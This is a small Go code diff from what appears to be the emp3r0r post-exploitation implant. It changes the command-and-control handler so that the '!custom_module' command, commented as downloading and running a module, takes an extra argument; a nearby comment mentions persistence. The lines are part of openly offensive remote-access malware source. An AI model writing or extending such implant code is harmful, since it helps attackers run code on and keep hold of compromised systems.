@@ -423,11 +423,11 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// download a module and run it
 	case "!custom_module":
-		if len(cmdSlice) != 2 {
+		if len(cmdSlice) != 3 {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
 			return
 		}
-		out = moduleHandler(cmdSlice[1])
+		out = moduleHandler(cmdSlice[1], cmdSlice[2])
 		sendResponse(out)
 
 		// persistence
